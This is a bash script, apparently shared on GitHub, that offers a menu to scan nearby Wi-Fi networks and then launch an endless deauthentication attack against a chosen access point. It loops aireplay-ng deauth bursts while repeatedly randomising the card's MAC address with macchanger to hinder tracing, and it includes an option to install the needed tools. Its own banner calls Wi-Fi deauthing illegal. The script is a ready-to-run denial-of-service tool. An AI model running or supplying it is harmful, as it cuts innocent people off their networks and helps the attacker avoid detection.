#!/bin/bash
if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Not running as root"
    exit
fi

    clear
    RED='\033[0;31m'
    YELLOW='\033[0;33;1m'
    GREEN='\033[0;32m'
    CYAN='\033[0;36m'
    NC='\033[0m'
    bold=$(tput bold)
    normal=$(tput sgr0)
    interfacemon=""

while :
do
echo -e ${RED}
 cat<< END
                    ><<       ><<      ><        ><<<<<            
                    >< ><<   ><<<     >< <<     ><<   ><<        
                    ><< ><< > ><<    ><  ><<    ><<    ><<
                    ><<  ><<  ><<   ><<   ><<   ><<    ><<
                    ><<   ><  ><<  ><<<<<< ><<  ><<    ><<
                    ><<       ><< ><<       ><< ><<   ><< 
                    ><<       ><<><<         ><<><<<<<                         
END
echo -e ${NC}
 echo -e Made By ${YELLOW}${bold}RollingThunder${NC}${normal} ${RED}V1.0${NC}
    echo
    echo -e "${CYAN}1)${NC}${bold}Scan Networks + Deauth"
    echo
    echo -e "${CYAN}2)${NC}${bold}Download/Update Tools"
    echo
    echo -e "${CYAN}3)${NC}${bold}Exit Script"
    echo
    echo https://github.com/RollingThunder777
    echo 
    echo -e ${RED}"DISCLAIMER: WIFI-DEAUTHING IS ILLEGAL AND CAN GET YOU IN TROUBLE,USE THIS SCRIPT AT YOUR OWN RISK AS I AM NOT RESPONSIBLE FOR ANY HARM YOU CAUSE OR ANY TROUBLE YOU GET INTO!"${NC}
    read -p "What do you want to do: " option
    
if [ $option -eq 1 ]
then
    read -p "Enter the name of your wireless card: " interface
    interfacemon="${interface}mon"
    # check if interface exists
    ifconfig $interface down
    if [ $? -eq 0 ]; then
            echo -e "${YELLOW}Setting Interface In Monitor Mode${NC}"
            sleep 2
            airmon-ng start $interface >/dev/null
            read -p ${bold}"The Script will now scan for networks.Press CTRL-C to stop the scan.Press ENTER to continue"${normal}
            airodump-ng $interfacemon
            read -p "Enter The Targeted Network's BSSID: " Bssid
            read -p "Enter The Targeted Network's Channel: " CH
            if ! [[ "$CH" =~ ^[0-9]+$ ]]
            then
                echo -e ${YELLOW}"Invalid Channel Number"${NC}
                airmon-ng stop $interfacemon >/dev/null
                exit 1
            fi  
            echo -e ${YELLOW}"Starting Attack"${NC}
            airmon-ng stop $interfacemon >/dev/null
            airmon-ng start $interface $CH >/dev/null
            # start deauth attack
            while true
            do
                ifconfig "${interface}mon" down
                echo -e ${YELLOW}
                macchanger -r wlan0mon |grep "New MAC"
                ifconfig "${interface}mon" up
                echo -e ${NC}
                aireplay-ng -0 5 -a $Bssid "${interface}mon"
                echo -e "${CYAN}RECHARGING...${NC}"
                sleep 3
                
            done
            
    else
            #invalid interface
            echo -e "${RED}ERROR: ${YELLOW}Please provide an existing interface as parameter!"
            exit 1
fi
elif [ $option -eq 3 ] 
then
    #exit script(option 3)
    echo -e ${YELLOW}"Changing interface to managed mode..."${NC}
    sleep 1
    airmon-ng stop wlan0mon >/dev/null
    exit 1
elif [ $option -eq 2 ] 
then
    #Update/Install Tools(option 2)
    apt-get install -y aircrack-ng 
    apt-get install macchanger
    echo -e ${YELLOW}${bold}"Done"${normal}${NC}
    sleep 2
    clear
else
    echo -e ${YELLOW}"INVALID OPTION"${NC}
    read -p ${bold}"Press ENTER to continue"${normal}
    clear
fi
done





